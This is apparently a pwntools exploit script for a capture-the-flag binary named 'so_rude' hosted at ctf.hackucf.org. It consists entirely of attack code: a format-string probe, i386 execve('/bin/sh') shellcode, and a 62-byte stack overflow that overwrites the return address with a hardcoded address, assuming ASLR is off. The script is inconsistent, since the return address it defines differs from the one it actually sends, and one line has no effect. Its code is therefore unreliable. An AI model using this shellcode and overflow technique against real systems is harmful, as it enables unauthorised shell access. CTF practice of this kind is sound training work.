from pwn import *
"""===============    Configuration    ================"""
pwnName = "so_rude"
local = True
libName = 'libpwnableharness32.so'
host, port = 'ctf.hackucf.org', 9006
context.endian = 'little'
context.arch = 'i386'
context.os = "linux"
context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h']
print "\n\n" + "="*60 + '\n'
"""===================================================="""
if local:
    r = process("./" + pwnName)
    #r = remote('localhost', 1234)
else:
    r = remote(host, port)


def sendToGDB( breakpoint=None):
    if not local:
        return
    #gdb.attach(r, execute='c')

    gdb.attach(r)


sendToGDB()
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
strVuln = "%x" + sc
r.recvline() + strVuln


#Send the string vuln
r.sendline(strVuln)


#Get the greeting and the format string vulnerability
print r.recvuntil(', ')
print r.recvline().strip()

#aslr off #f7ff04c0
address = '\xc4\x04\xff\xf7'

#Send the payload
#THE BUFF SIZE is 62 to the return address
print address
payload = 'a' *62 + '\xc0' + '\x04' + '\xff' + '\xff'
#p32(0x804852B)


r.sendline(payload)
print r.recvline()


